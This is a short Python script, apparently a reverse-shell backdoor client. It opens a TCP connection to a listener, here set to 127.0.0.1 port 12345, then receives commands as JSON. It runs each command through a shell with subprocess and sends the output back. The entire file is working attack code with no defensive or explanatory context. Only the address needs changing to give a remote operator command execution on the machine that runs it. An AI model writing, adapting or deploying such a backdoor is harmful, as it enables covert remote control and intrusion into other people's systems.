#!/usr/bin/python3
import json 
import socket
import subprocess


def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())


def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue


def shell():
    while True:
        command = reliable_recv()
        if command == "q":
            break
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode())
            except:
                reliable_send("[!!] Can't Execute That Command")


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 12345))
print("Connection stablished to server!")
shell()
sock.close()
